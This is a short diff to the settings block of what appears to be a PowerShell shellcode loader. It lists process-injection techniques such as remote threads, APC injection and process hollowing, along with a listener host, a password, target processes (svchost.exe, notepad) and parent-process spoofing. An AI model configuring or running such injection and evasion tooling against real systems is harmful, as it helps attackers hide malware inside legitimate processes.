@@ -1,4 +1,19 @@
-# module name
+<#
+.DESCRIPTION
+
+Module name. Choose from:
+  
+  "functionpointer",
+  "functionpointerv2",
+  "clipboardpointer",
+  "currentthread",
+  "remotethread",
+  "remotethreadview",
+  "remotethreadsuspended",
+  "remotethreadapc",
+  "remotethreadcontext",
+  "processhollow"
+#>
 $A = "currentthread"
 
 # lhost
@@ -19,7 +34,7 @@ $F = "Passw0rd!"
 # path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $G = "C:\Windows\System32\svchost.exe"
 
-# existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
+# existing process name to inject into (used in "remotethread", "remotethreadview" and "remotethreadsuspended")
 $H = "notepad"
 
 # parent process name to spoof the original value (use "0" to disable PPID spoofing)
